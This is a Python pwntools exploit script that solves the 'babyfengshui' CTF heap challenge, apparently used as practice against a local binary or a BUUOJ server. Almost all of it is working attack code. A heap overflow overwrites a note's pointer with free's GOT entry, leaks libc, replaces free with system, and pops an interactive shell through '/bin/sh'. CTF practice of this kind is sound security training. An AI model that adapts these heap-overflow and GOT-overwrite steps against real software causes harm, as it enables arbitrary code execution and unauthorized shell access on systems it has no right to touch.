from pwn import *
from time import *
context.binary = './babyfengshui_33c3_2016'
#context.log_level = 'debug'
context.timeout = None
elf = context.binary


if args['REMOTE']:
	p = remote('pwn.buuoj.cn', 20002)
	libc = ELF('../x86_libc.so.6')
else:
	libc = context.binary.libc
	p = process('./babyfengshui_33c3_2016')

def dbg():
	raw_input()
def cmd(c):
	p.recvuntil('Action: ')
	p.sendline(str(c))

def add(size, name, content):
	cmd(0)
	p.sendlineafter('description: ', str(size))
	p.sendlineafter('name: ', name)
	p.sendlineafter('text length: ', str(size))
	p.sendlineafter('text: ', content)

	print "add a note success"

def update(idx, content):
	size = len(content) + 1
	cmd(3)
	p.sendlineafter('index: ', str(idx))
	p.sendlineafter('text length: ', str(size))
	p.sendlineafter('text: ', content)

	print "update note %d success" % idx
def show(idx):
	cmd(2)
	p.sendlineafter('index: ', str(idx))

	print "show note %d success" % idx
def delete(idx):
	cmd(1)
	sleep(.5)
	p.recvuntil('index: ')
	p.sendline(str(idx))
	print "delete note %d success " % idx

#unlink
"""
ptr = 0x804b080
fake_fd = ptr - 0xc
fake_bk = ptr - 0x8

name = p32(0) + p32(0x148) + p32(fake_fd) + p32(fake_bk)
add(0x38, 'tre', name)
add(0x80, 'backer', 'b'*0x80)

payload = 'b'*0x80 + p32(0x148)
update(1, 0x83, payload)
"""
#delete(1)

free_got = elf.got['free']
print "free_got ==> " + hex(free_got)
#
add(0x48, 'tre', 'a'*0x40)					#0
add(0x48, 'backer', 'b'*0x40)				#1
#gdb.attach(p, 'b* 0x08048A68')
dbg()
delete(0)


fake_size = 0x40+0x90
add(fake_size, 'fake', 'fake_data')		#2 cover 0'content and note


payload = '/bin/sh\x00'
payload = payload.ljust(fake_size, 'a')
payload += p32(fake_size+8) 
payload += p32(0x51)
payload = payload.ljust(fake_size + 0x58-0x8, 'a')
payload += p32(0x50) + p32(0x89)
payload += p32(free_got)
update(2, payload)

show(1)
p.recvuntil('description: ')
free_addr = u32(p.recv(4))

libc_base = free_addr - libc.symbols['free']
system_addr = libc_base + libc.symbols['system']
print "free_addr ==> "+hex(free_addr)
print "system_addr ==> "+hex(system_addr)

update(1, p32(system_addr))
delete(2)

p.interactive()
p.close()
